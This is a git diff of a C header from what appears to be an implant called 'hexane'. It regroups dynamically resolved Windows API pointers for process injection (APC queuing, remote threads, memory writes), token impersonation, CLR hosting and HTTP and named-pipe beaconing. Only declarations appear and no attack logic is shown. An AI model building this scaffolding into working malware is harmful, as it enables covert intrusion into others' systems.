@@ -556,9 +556,164 @@ typedef struct _stream {
 	_stream  	*next;
 } STREAM, *PSTREAM;
 
+struct _secapi {
+	DTYPE(LookupAccountSidW);
+	DTYPE(LookupPrivilegeValueA);
+	DTYPE(AddMandatoryAce);
+	DTYPE(SetEntriesInAclA);
+	DTYPE(AllocateAndInitializeSid);
+		
+	DTYPE(InitializeSecurityDescriptor);
+	DTYPE(SetSecurityDescriptorDacl);
+	DTYPE(SetSecurityDescriptorSacl);
+	DTYPE(InitializeAcl);
+	DTYPE(FreeSid);
+} secapi;
 
-struct _hexane{
 
+typedef struct _netapi {
+	DTYPE(WinHttpOpen);
+	DTYPE(WinHttpConnect);
+	DTYPE(WinHttpOpenRequest);
+	DTYPE(WinHttpAddRequestHeaders);
+	DTYPE(WinHttpSetOption);
+	DTYPE(WinHttpGetProxyForUrl);
+	DTYPE(WinHttpGetIEProxyConfigForCurrentUser);
+	DTYPE(WinHttpSendRequest);
+	DTYPE(WinHttpReceiveResponse);
+	DTYPE(WinHttpReadData);
+	DTYPE(WinHttpQueryHeaders);
+	DTYPE(WinHttpQueryDataAvailable);
+	DTYPE(WinHttpCloseHandle);
+	
+	DTYPE(CallNamedPipeW);
+	DTYPE(CreateNamedPipeW);
+	DTYPE(WaitNamedPipeW);
+	DTYPE(SetNamedPipeHandleState);
+	DTYPE(ConnectNamedPipe);
+	DTYPE(TransactNamedPipe);
+	DTYPE(DisconnectNamedPipe);
+	DTYPE(PeekNamedPipe);
+} netapi;
+
+
+typedef struct _procapi {
+	NtOpenProcess_t NtOpenProcess;
+	NtCreateUserProcess_t NtCreateUserProcess;
+	NtTerminateProcess_t NtTerminateProcess;
+	RtlCreateProcessParametersEx_t RtlCreateProcessParametersEx;
+	RtlDestroyProcessParameters_t RtlDestroyProcessParameters;
+	NtOpenProcessToken_t NtOpenProcessToken;
+    NtOpenThreadToken_t NtOpenThreadToken;
+	NtDuplicateToken_t NtDuplicateToken;
+	NtDuplicateObject_t NtDuplicateObject;
+	NtQueryInformationToken_t NtQueryInformationToken;
+	NtQueryInformationProcess_t NtQueryInformationProcess;
+		
+	DTYPE(GetProcessId);
+	DTYPE(Process32First);
+	DTYPE(Process32Next);
+    DTYPE(Module32First);
+    DTYPE(Module32Next);
+	DTYPE(ImpersonateLoggedOnUser);
+	DTYPE(AdjustTokenPrivileges);
+} procapi;
+
+
+typedef struct _memapi {
+	NtFreeVirtualMemory_t NtFreeVirtualMemory;
+	NtAllocateVirtualMemory_t NtAllocateVirtualMemory;
+	NtProtectVirtualMemory_t NtProtectVirtualMemory;
+	NtReadVirtualMemory_t NtReadVirtualMemory;
+	NtWriteVirtualMemory_t NtWriteVirtualMemory;
+	NtQueryVirtualMemory_t NtQueryVirtualMemory;
+	NtCreateSection_t NtCreateSection;
+	NtMapViewOfSection_t NtMapViewOfSection;
+	NtUnmapViewOfSection_t NtUnmapViewOfSection;
+	RtlAddVectoredExceptionHandler_t RtlAddVectoredExceptionHandler;
+	RtlRemoveVectoredExceptionHandler_t RtlRemoveVectoredExceptionHandler;
+	SetProcessValidCallTargets_t SetProcessValidCallTargets;
+
+	DTYPE(GetProcAddress);
+	DTYPE(GetModuleHandleA);
+	DTYPE(LoadLibraryA);
+	DTYPE(FreeLibrary);
+} memapi;
+
+
+typedef struct _heapapi {
+	RtlCreateHeap_t RtlCreateHeap;
+	RtlAllocateHeap_t RtlAllocateHeap;
+	RtlReAllocateHeap_t RtlReAllocateHeap;
+	RtlFreeHeap_t RtlFreeHeap;
+	RtlDestroyHeap_t RtlDestroyHeap;
+} heapapi;
+
+
+typedef struct _enumapi {
+	DTYPE(RegOpenKeyExA);
+    DTYPE(RegCreateKeyExA);
+    DTYPE(RegSetValueExA);
+    DTYPE(RegCloseKey);
+	DTYPE(IsWow64Process);
+	DTYPE(GetUserNameA);
+	DTYPE(CreateToolhelp32Snapshot);
+	DTYPE(GetAdaptersInfo);
+	DTYPE(GetCurrentProcessId);
+	DTYPE(GlobalMemoryStatusEx);
+	DTYPE(GetComputerNameExA);
+				
+	RtlGetVersion_t RtlGetVersion;
+	NtQuerySystemInformation_t NtQuerySystemInformation;
+	CLRCreateInstance_t CLRCreateInstance;
+} enumapi;
+
+
+typedef struct _threadapi {
+	NtCreateThreadEx_t NtCreateThreadEx;
+	NtOpenThread_t NtOpenThread;
+	NtTerminateThread_t NtTerminateThread;
+	NtResumeThread_t NtResumeThread;
+	NtGetContextThread_t NtGetContextThread;
+	NtSetContextThread_t NtSetContextThread;
+	NtSetInformationThread_t NtSetInformationThread;
+} threadapi;
+
+
+typedef struct _apcapi {
+	TpAllocWork_t TpAllocWork;
+	TpPostWork_t TpPostWork;
+	TpReleaseWork_t TpReleaseWork;
+
+	NtTestAlert_t NtTestAlert;
+	NtDelayExecution_t NtDelayExecution;
+	NtCreateEvent_t NtCreateEvent;
+	NtQueueApcThread_t NtQueueApcThread;
+	NtAlertResumeThread_t NtAlertResumeThread;
+	NtWaitForSingleObject_t NtWaitForSingleObject;
+	NtSignalAndWaitForSingleObject_t NtSignalAndWaitForSingleObject;
+	NtContinue_t NtContinue;
+} apcapi;
+
+
+struct _utilapi {
+	DTYPE(SleepEx);
+	DTYPE(CryptStringToBinaryA);
+	DTYPE(CryptBinaryToStringA);
+	DTYPE(FindResourceA);
+	DTYPE(LoadResource);
+	DTYPE(LockResource);
+	DTYPE(SizeofResource);
+	DTYPE(FreeResource);
+
+	RtlInitUnicodeString_t RtlInitUnicodeString;
+	RtlRandomEx_t RtlRandomEx;
+	NtClose_t NtClose;
+} utilapi;
+
+
+struct _hexane {
+// TODO: set standard apis for stagers and payloads
 	PTEB 			teb;
 	LPVOID 			heap;
 	DWORD 			threads;
@@ -592,13 +747,13 @@ struct _hexane{
 	} config;
 
 	struct {
+		WORD	arch;
 		ULONG	ppid;
 		ULONG	pid;
 		ULONG	tid;
 		ULONG	version;
 		ULONG	current_taskid;
         ULONG	peer_id;
-		WORD	arch;
 		INT		retries;
 		BOOL	checkin;
 	} session;
@@ -615,171 +770,8 @@ struct _hexane{
 		BOOL	    	b_proxy;
 		BOOL	    	b_envproxy;
 		BOOL	    	b_envproxy_check;
-	} transport;
-
-	struct {
-		NtFreeVirtualMemory_t NtFreeVirtualMemory;
-		NtAllocateVirtualMemory_t NtAllocateVirtualMemory;
-		NtProtectVirtualMemory_t NtProtectVirtualMemory;
-		NtReadVirtualMemory_t NtReadVirtualMemory;
-		NtWriteVirtualMemory_t NtWriteVirtualMemory;
-		NtQueryVirtualMemory_t NtQueryVirtualMemory;
-		NtCreateSection_t NtCreateSection;
-		NtMapViewOfSection_t NtMapViewOfSection;
-		NtUnmapViewOfSection_t NtUnmapViewOfSection;
-
-		NtOpenProcess_t NtOpenProcess;
-		NtCreateUserProcess_t NtCreateUserProcess;
-		NtTerminateProcess_t NtTerminateProcess;
-		RtlCreateProcessParametersEx_t RtlCreateProcessParametersEx;
-		RtlDestroyProcessParameters_t RtlDestroyProcessParameters;
-		NtOpenProcessToken_t NtOpenProcessToken;
-        NtOpenThreadToken_t NtOpenThreadToken;
-		NtDuplicateToken_t NtDuplicateToken;
-		NtDuplicateObject_t NtDuplicateObject;
-		NtQueryInformationToken_t NtQueryInformationToken;
-		NtQueryInformationProcess_t NtQueryInformationProcess;
-
-		RtlCreateHeap_t RtlCreateHeap;
-		RtlAllocateHeap_t RtlAllocateHeap;
-		RtlReAllocateHeap_t RtlReAllocateHeap;
-		RtlFreeHeap_t RtlFreeHeap;
-		RtlDestroyHeap_t RtlDestroyHeap;
-		RtlInitUnicodeString_t RtlInitUnicodeString;
-
-		RtlAddVectoredExceptionHandler_t RtlAddVectoredExceptionHandler;
-		RtlRemoveVectoredExceptionHandler_t RtlRemoveVectoredExceptionHandler;
-		NtCreateThreadEx_t NtCreateThreadEx;
-		NtOpenThread_t NtOpenThread;
-		NtTerminateThread_t NtTerminateThread;
-
-		RtlRandomEx_t RtlRandomEx;
-		NtResumeThread_t NtResumeThread;
-		NtGetContextThread_t NtGetContextThread;
-		NtSetContextThread_t NtSetContextThread;
-		NtSetInformationThread_t NtSetInformationThread;
-		NtWaitForSingleObject_t NtWaitForSingleObject;
-
-		TpAllocWork_t TpAllocWork;
-		TpPostWork_t TpPostWork;
-		TpReleaseWork_t TpReleaseWork;
-		NtTestAlert_t NtTestAlert;
-		NtClose_t NtClose;
-
-		RtlGetVersion_t RtlGetVersion;
-		NtQuerySystemInformation_t NtQuerySystemInformation;
-        SetProcessValidCallTargets_t SetProcessValidCallTargets;
-		NtDeviceIoControlFile_t NtDeviceIoControlFile;
-		NtOpenFile_t NtOpenFile;
-
-		CLRCreateInstance_t CLRCreateInstance;
-		NtDelayExecution_t NtDelayExecution;
-		NtCreateEvent_t NtCreateEvent;
-		NtQueueApcThread_t NtQueueApcThread;
-		NtContinue_t NtContinue;
-		NtAlertResumeThread_t NtAlertResumeThread;
-		NtSignalAndWaitForSingleObject_t NtSignalAndWaitForSingleObject;
-	} nt;
-
-	struct {
-		DTYPE(LoadLibraryA);
-		DTYPE(FreeLibrary);
-		DTYPE(Heap32ListFirst);
-		DTYPE(Heap32ListNext);
-		DTYPE(GetProcessHeap);
-		DTYPE(GetProcessHeaps);
-		DTYPE(GetProcAddress);
-		DTYPE(GetModuleHandleA);
-
-		DTYPE(IsWow64Process);
-        DTYPE(OpenProcess);
-		DTYPE(CreateToolhelp32Snapshot);
-		DTYPE(Process32First);
-		DTYPE(Process32Next);
-        DTYPE(Module32First);
-        DTYPE(Module32Next);
-		DTYPE(GetCurrentProcessId);
-		DTYPE(GetProcessId);
-		DTYPE(ImpersonateLoggedOnUser);
-		DTYPE(AdjustTokenPrivileges);
-
-		DTYPE(GlobalMemoryStatusEx);
-		DTYPE(GetComputerNameExA);
-		DTYPE(SetLastError);
-		DTYPE(GetLastError);
-
-        DTYPE(RegOpenKeyExA);
-        DTYPE(RegCreateKeyExA);
-        DTYPE(RegSetValueExA);
-        DTYPE(RegCloseKey);
-
-		DTYPE(ReadFile);
-		DTYPE(WriteFile);
-		DTYPE(CreateFileW);
-		DTYPE(GetFileSizeEx);
-        DTYPE(SetFilePointer);
-		DTYPE(GetFullPathNameA);
-		DTYPE(FindFirstFileA);
-		DTYPE(FindClose);
-		DTYPE(FindNextFileA);
-		DTYPE(GetCurrentDirectoryA);
-		DTYPE(FileTimeToSystemTime);
-		DTYPE(SystemTimeToTzSpecificLocalTime);
-		DTYPE(GetLocalTime);
-		DTYPE(GetSystemTimeAsFileTime);
-
-		DTYPE(FormatMessageA);
-		DTYPE(CreateRemoteThread);
-		DTYPE(CreateThread);
-		DTYPE(ExitThread);
-		DTYPE(QueueUserAPC);
-		DTYPE(GetThreadLocale);
-		DTYPE(SleepEx);
-
-		DTYPE(WinHttpOpen);
-		DTYPE(WinHttpConnect);
-		DTYPE(WinHttpOpenRequest);
-		DTYPE(WinHttpAddRequestHeaders);
-		DTYPE(WinHttpSetOption);
-		DTYPE(WinHttpGetProxyForUrl);
-		DTYPE(WinHttpGetIEProxyConfigForCurrentUser);
-		DTYPE(WinHttpSendRequest);
-		DTYPE(WinHttpReceiveResponse);
-		DTYPE(WinHttpReadData);
-		DTYPE(WinHttpQueryHeaders);
-		DTYPE(WinHttpQueryDataAvailable);
-		DTYPE(WinHttpCloseHandle);
-		DTYPE(GetAdaptersInfo);
-
-		DTYPE(CryptStringToBinaryA);
-		DTYPE(CryptBinaryToStringA);
-		DTYPE(FindResourceA);
-		DTYPE(LoadResource);
-		DTYPE(LockResource);
-		DTYPE(SizeofResource);
-		DTYPE(FreeResource);
-
-		DTYPE(CallNamedPipeW);
-		DTYPE(CreateNamedPipeW);
-		DTYPE(WaitNamedPipeW);
-		DTYPE(SetNamedPipeHandleState);
-		DTYPE(ConnectNamedPipe);
-		DTYPE(TransactNamedPipe);
-		DTYPE(DisconnectNamedPipe);
-		DTYPE(PeekNamedPipe);
-
-		DTYPE(GetUserNameA);
-		DTYPE(LookupAccountSidW);
-		DTYPE(LookupPrivilegeValueA);
-		DTYPE(SetEntriesInAclA);
-		DTYPE(AllocateAndInitializeSid);
-		DTYPE(AddMandatoryAce);
-		DTYPE(InitializeSecurityDescriptor);
-		DTYPE(SetSecurityDescriptorDacl);
-		DTYPE(SetSecurityDescriptorSacl);
-		DTYPE(InitializeAcl);
-		DTYPE(FreeSid);
-	} win32;
+	} network;	
 };
 
 #endif
+
